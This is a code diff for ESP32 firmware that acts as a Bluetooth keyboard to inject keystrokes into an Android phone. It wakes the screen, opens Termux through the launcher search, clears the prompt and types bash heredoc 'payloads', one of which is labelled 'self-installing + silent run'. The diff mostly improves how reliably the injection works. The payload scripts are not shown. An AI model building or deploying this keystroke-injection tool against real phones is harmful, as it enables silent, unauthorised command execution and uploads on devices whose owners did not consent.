@@ -50,26 +50,19 @@
 // ── Timing constants (all in milliseconds) ───────────────────────────────────
 // Increase these if your device is slower or Termux fails to open reliably.
 
-// Wait after BLE connects before the first keystroke.
-// Gives Android time to fully register the HID keyboard.
-#define CONNECT_SETTLE_MS   4000UL
+#define CONNECT_SETTLE_MS   4000UL  // Wait after BLE connects before first keystroke
+#define HOME_SETTLE_MS      1800UL  // Wait after WIN key for launcher to settle
+#define SEARCH_SETTLE_MS    1200UL  // Wait after opening search before typing
+#define APP_LOAD_MS         5000UL  // Wait after Enter for Termux to fully load
+#define PROMPT_CLEAR_MS      500UL  // Delay between CTRL+C and CTRL+U
+#define COOLDOWN_MS        60000UL  // Min time between payload executions
 
-// Wait after WIN key for the home screen / launcher to fully settle.
-// Increase to 2000 on slower/older devices.
-#define HOME_SETTLE_MS      1800UL
-
-// Wait for the launcher search overlay to appear after typing starts.
-#define SEARCH_OVERLAY_MS    800UL
-
-// Wait after pressing Enter on the Termux search result for the app to load.
-// First launch or after reboot can take 5–6 s — keep this at 5000+.
-#define APP_LOAD_MS         5000UL
-
-// Wait between CTRL+C and CTRL+U when clearing the shell prompt.
-#define PROMPT_CLEAR_MS      500UL
-
-// Minimum time between two payload executions on the same connection.
-#define COOLDOWN_MS        60000UL
+// ── Open method ───────────────────────────────────────────────────────────────
+// Try these in order if Termux fails to open:
+//   1 = KEY_SEARCH (best — hardware search key, works on all Android versions)
+//   2 = WIN + typing (works on stock/Pixel, may fail on Samsung/MIUI)
+//   3 = WIN + A (opens app drawer, works on stock Android only)
+#define OPEN_METHOD  1
 
 // ── State ─────────────────────────────────────────────────────────────────────
 
@@ -97,57 +90,109 @@ void pressEnter(int waitMs = 200) {
   delay(waitMs);
 }
 
-// Wake the screen with a media-key tap.
-// Works even when the screen is off — no PIN needed, just wakes the display.
+// ── Screen wake ───────────────────────────────────────────────────────────────
 void wakeScreen() {
-  // KEY_MEDIA_VOLUME_UP is a safe no-op if volume is already max.
-  // The tap wakes the display on all Android versions.
   bleKeyboard.press(KEY_MEDIA_VOLUME_UP);
-  delay(80);
-  bleKeyboard.releaseAll();
-  delay(600);   // let the screen fully illuminate
+  delay(80); bleKeyboard.releaseAll();
+  delay(700);
   Serial.println("[timing] Screen wake sent.");
 }
 
-// WIN alone → Home screen on all Android launchers.
-// WIN+S = screenshot — do NOT use that.
+// ── Go home ───────────────────────────────────────────────────────────────────
 void goHome() {
-  bleKeyboard.press(KEY_LEFT_GUI);
-  delay(180);
-  bleKeyboard.releaseAll();
-  delay(HOME_SETTLE_MS);   // wait for home screen / launcher to settle
-}
-
-// Dismiss any overlay (notification shade, search bar, dialog) with ESC,
-// then go home. Belt-and-suspenders before every launcher search.
-void dismissAndGoHome() {
-  // ESC closes most Android overlays (requires Android 12+; no-op on older)
+  // ESC first to dismiss any overlay (notification shade, dialog, search bar)
   bleKeyboard.press(KEY_ESC);
-  delay(80);
-  bleKeyboard.releaseAll();
-  delay(300);
+  delay(100); bleKeyboard.releaseAll(); delay(300);
 
-  goHome();
-
-  // Second HOME tap — some launchers need two taps to get to the clean
-  // home grid (first tap closes recent apps, second tap goes to page 1)
+  // WIN key → home screen
   bleKeyboard.press(KEY_LEFT_GUI);
-  delay(180);
-  bleKeyboard.releaseAll();
+  delay(180); bleKeyboard.releaseAll();
   delay(HOME_SETTLE_MS);
+
+  // Second WIN tap — clears "recent apps" view on some launchers
+  bleKeyboard.press(KEY_LEFT_GUI);
+  delay(180); bleKeyboard.releaseAll();
+  delay(HOME_SETTLE_MS);
+
   Serial.println("[timing] Home screen confirmed.");
 }
 
-// Open an app by typing its name in the launcher search, then pressing Enter.
+// ── Clear any input on the screen before we start typing ─────────────────────
+void clearInput() {
+  // Select-all then delete — clears any text in an active search box
+  bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('a');
+  delay(80); bleKeyboard.releaseAll(); delay(150);
+  bleKeyboard.press(KEY_DELETE);
+  delay(80); bleKeyboard.releaseAll(); delay(150);
+}
+
+// ── Open search, type app name, press Enter ───────────────────────────────────
+//
+// OPEN_METHOD 1 — KEY_SEARCH  (recommended for all launchers)
+//   Android's dedicated Search key. Maps to the hardware search button that
+//   every Android device has had since Android 1.5. Even on devices without
+//   a physical search button, the HID keycode is handled by the OS and always
+//   opens the global app / assistant search. Works on Samsung, MIUI, ColorOS,
+//   stock, and every other launcher.
+//
+// OPEN_METHOD 2 — WIN + typing  (stock Android / Pixel only)
+//   On stock Android, typing on the home screen opens the launcher search.
+//   Fails silently on Samsung OneUI, MIUI, ColorOS (keystrokes are ignored
+//   unless the search bar is explicitly focused).
+//
+// OPEN_METHOD 3 — WIN + A  (stock Android app drawer)
+//   Opens the full app drawer. Reliable on Pixel/AOSP but not on
+//   heavily skinned launchers (Samsung, MIUI use different shortcuts).
+//
+void openSearch() {
+#if OPEN_METHOD == 1
+  // Best method: press the SEARCH key (HID Usage 0x0221 — AC Search).
+  // Android maps this directly to the global app/assistant search on every
+  // launcher (Samsung, MIUI, ColorOS, stock, AOSP — all respond to it).
+  // In BleKeyboard the media report is a 2-byte array:
+  //   byte[0] bits: Play=0x01 Pause=0x02 Next=0x04 Prev=0x08
+  //                 VolUp=0x10 VolDown=0x20 Mute=0x40 WWW=0x80
+  //   byte[1] bits: MediaSel=0x01 Mail=0x02 Calc=0x04 Explorer=0x08
+  //                 Search=0x10  Home=0x20  Back=0x40  ...
+  Serial.println("[search] Using SEARCH key (method 1)");
+  {
+    MediaKeyReport searchKey = {0x00, 0x10};  // byte[1] bit4 = AC Search
+    bleKeyboard.press(searchKey);
+    delay(120);
+    bleKeyboard.releaseAll();
+  }
+  delay(SEARCH_SETTLE_MS);
+
+#elif OPEN_METHOD == 2
+  // Type on home screen — only works on stock/Pixel
+  Serial.println("[search] Using home-screen typing (method 2)");
+  // No extra key needed — just start typing
+
+#elif OPEN_METHOD == 3
+  // WIN + A = app drawer on stock Android
+  Serial.println("[search] Using WIN+A app drawer (method 3)");
+  bleKeyboard.press(KEY_LEFT_GUI); bleKeyboard.press('a');
+  delay(150); bleKeyboard.releaseAll();
+  delay(SEARCH_SETTLE_MS);
+#endif
+}
+
 void openApp(const char* appName) {
-  dismissAndGoHome();
+  goHome();
+  openSearch();
 
-  // Type the app name slowly — the launcher search overlay needs to appear first
-  delay(SEARCH_OVERLAY_MS);
-  typeString(appName, 70);   // 70 ms/char gives overlay time to index each char
-  delay(900);                // let search results populate
+  // Clear any stale text in the search box
+  clearInput();
+  delay(300);
 
-  pressEnter(APP_LOAD_MS);   // Enter → first result opens; wait for app to load
+  // Type the app name one character at a time, slowly
+  // 80 ms/char is deliberate — gives the search index time to filter
+  typeString(appName, 80);
+  delay(1000);   // wait for search results to populate
+
+  // Press Enter to open the top result, then wait for the app to load
+  pressEnter(APP_LOAD_MS);
+  Serial.println("[search] App launch Enter sent — waiting for load.");
 }
 
 // Type one heredoc line then press Enter.
@@ -156,35 +201,64 @@ void typeLine(const char* line) {
   pressEnter(120);
 }
 
-// ── Common: open Termux and clear prompt ──────────────────────────────────────
+// ── Open Termux and clear the shell prompt, with retry ───────────────────────
 
-void openTermuxClean() {
-  // STEP 1: wake screen so keystrokes don't land on the lock screen
-  wakeScreen();
+bool openTermuxClean() {
+  const int MAX_TRIES = 3;
 
-  // STEP 2: open Termux via launcher search
-  Serial.println("[payload] Opening Termux...");
-  openApp("Termux");
-  Serial.println("[payload] Termux opened — waiting for shell prompt.");
+  for (int attempt = 1; attempt <= MAX_TRIES; attempt++) {
+    Serial.print("[payload] Opening Termux — attempt ");
+    Serial.print(attempt); Serial.print(" / "); Serial.println(MAX_TRIES);
 
-  // Extra wait: Termux needs a moment after launch before it accepts input.
-  // On first launch this can be 4-5 s; subsequent launches are faster.
-  delay(1500);
+    // Wake screen before every attempt
+    wakeScreen();
 
-  // STEP 3: clear the prompt safely
-  // ESC first — dismisses any Termux permission dialog or welcome screen
-  bleKeyboard.press(KEY_ESC);
-  delay(80); bleKeyboard.releaseAll(); delay(300);
+    // Open Termux via search
+    openApp("Termux");
 
-  // CTRL+C kills any running foreground process (safe no-op if idle)
-  bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('c');
-  delay(120); bleKeyboard.releaseAll(); delay(PROMPT_CLEAR_MS);
+    // Extra settle: Termux takes longer on first launch
+    delay(1500);
 
-  // CTRL+U clears any characters already on the current input line
-  bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('u');
-  delay(120); bleKeyboard.releaseAll(); delay(PROMPT_CLEAR_MS);
+    // Check: is the keyboard still connected? If not, abort.
+    if (!bleKeyboard.isConnected()) {
+      Serial.println("[payload] BLE disconnected mid-sequence — aborting.");
+      return false;
+    }
 
-  Serial.println("[payload] Prompt cleared — ready for injection.");
+    // Clear the prompt:
+    //   ESC   — dismiss any Termux welcome screen / permission dialog
+    //   CTRL+C — kill any running foreground process
+    //   CTRL+U — clear the current input line
+    bleKeyboard.press(KEY_ESC);
+    delay(100); bleKeyboard.releaseAll(); delay(400);
+
+    bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('c');
+    delay(120); bleKeyboard.releaseAll(); delay(PROMPT_CLEAR_MS);
+
+    bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('u');
+    delay(120); bleKeyboard.releaseAll(); delay(PROMPT_CLEAR_MS);
+
+    // Type a harmless probe: echo a known string and press Enter.
+    // If Termux is open and ready, this produces visible output.
+    // We can't read the screen from the ESP32, but at least the heredoc
+    // will follow immediately if the prompt is clean.
+    typeString("echo __READY__", 35);
+    pressEnter(600);
+
+    Serial.print("[payload] Attempt "); Serial.print(attempt);
+    Serial.println(" complete — clearing probe output.");
+
+    // Clear the probe output line
+    bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('u');
+    delay(100); bleKeyboard.releaseAll(); delay(300);
+
+    // If we made it here without disconnect, consider it a success
+    Serial.println("[payload] Termux open — prompt ready.");
+    return true;
+  }
+
+  Serial.println("[payload] All attempts failed.");
+  return false;
 }
 
 // ── AUTO payload — self-installing + silent run ───────────────────────────────
@@ -196,7 +270,10 @@ void openTermuxClean() {
 
 void runAutoPayload() {
   Serial.println("[AUTO payload] Starting self-install + run...");
-  openTermuxClean();
+  if (!openTermuxClean()) {
+    Serial.println("[AUTO payload] Aborted — could not open Termux.");
+    return;
+  }
 
   // Inject bash heredoc — bash buffers all lines before executing,
   // so the ESP32 only needs to wait for typing to finish.
@@ -239,7 +316,10 @@ void runAutoPayload() {
 
 void runManualPayload() {
   Serial.println("[MANUAL payload] Starting heredoc injection...");
-  openTermuxClean();
+  if (!openTermuxClean()) {
+    Serial.println("[MANUAL payload] Aborted — could not open Termux.");
+    return;
+  }
 
   // STEP 3: inject bash heredoc
   // bash buffers the entire script until UPLOAD_END, then executes it
